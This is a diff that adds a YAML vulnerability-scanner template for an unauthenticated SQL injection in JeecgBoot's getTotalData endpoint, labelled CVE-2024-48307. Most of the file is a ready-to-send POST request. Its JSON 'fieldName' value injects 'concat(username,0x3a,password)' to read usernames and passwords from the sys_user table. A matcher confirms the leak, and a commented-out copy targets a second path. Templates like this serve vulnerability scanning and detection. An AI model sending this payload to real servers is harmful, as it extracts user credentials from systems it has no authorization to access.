@@ -1,0 +1,44 @@
+id: jeecg-boot-drag-getTotalData-sqli
+
+info:
+  name: JeecgBoot onlDragDatasetHead/getTotalData SQL注入漏洞(CVE-2024-48307)
+  author: unknown
+  severity: high
+  tags: cve,cve2024,jeecg,sql注入,未授权
+
+http:
+  - raw:
+      - |
+        POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+
+        {"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"chartData") && contains(body,"concat(username") && contains(body,"yAxisIndex")
+
+  # - raw:
+  #     - |
+  #       POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
+  #       Host: {{Hostname}}
+  #       Accept-Encoding: gzip, deflate
+  #       Accept: */*
+  #       Accept-Language: en-US;q=0.9,en;q=0.8
+  #       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+  #       Connection: close
+  #       Content-Type: application/json
+
+  #       {"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         - status_code==200 && contains(body,"chartData") && contains(body,"concat(username") && contains(body,"yAxisIndex")
